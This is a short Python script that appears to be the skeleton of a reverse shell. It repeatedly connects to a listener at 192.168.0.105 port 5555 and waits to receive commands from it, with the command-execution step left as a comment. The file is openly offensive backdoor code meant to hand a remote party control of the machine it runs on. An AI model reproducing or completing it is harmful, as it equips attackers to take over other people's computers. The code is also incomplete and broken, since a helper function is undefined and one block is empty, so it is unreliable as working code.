import socket 
import time

def connection():
	while True:
		time.sleep(20)
		try:
			s.connect(('192.168.0.105', 5555))
			shell()
			s.close()
			break
		except:
			connection()
	
def shell():
	while True:
		command = reliable_recv()
		if command == 'quit':
			break
		else: 
			# execute the command
		
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
